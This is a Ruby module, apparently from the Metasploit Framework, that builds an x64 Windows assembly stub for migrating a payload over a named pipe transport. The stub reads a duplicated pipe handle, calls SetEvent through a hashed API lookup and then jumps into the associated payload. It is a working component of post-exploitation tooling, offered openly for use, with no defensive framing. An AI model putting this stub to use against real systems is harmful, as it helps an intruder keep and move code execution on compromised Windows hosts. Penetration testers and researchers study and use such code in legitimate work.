# -*- coding: binary -*-

require 'msf/core'
require 'msf/core/payload/windows/migrate_common'

module Msf

###
#
# Payload that supports migrating over Named Pipe transports on x64.
#
###

module Payload::Windows::MigrateNamedPipe_x64

  include Msf::Payload::Windows::MigrateCommon_x64

  def initialize(info={})
    super(update_info(info,
      'Name'        => 'Migrate over Named Pipe transport (x64)',
      'Description' => 'Migration stub to use over Named Pipe transports (x64)',
      'Author'      => ['OJ Reeves'],
      'License'     => MSF_LICENSE,
      'Platform'    => 'win',
      'Arch'        => ARCH_X64,
    ))
  end

  #
  # Constructs the payload
  #
  def generate_migrate(opts = {})
    %Q^
    start_migrate_pipe:
      mov rdi, qword [rsi+16]   ; The duplicated pipe handle is in the migrate context.
    signal_pipe_event:
      mov rcx, qword [rsi]      ; Event handle is pointed at by rsi
      mov r10d, #{Rex::Text.block_api_hash('kernel32.dll', 'SetEvent')}
      call rbp                  ; SetEvent(handle)
    call_pipe_payload:
      call qword [rsi+8]        ; call the associated payload
    ^
  end

end

end
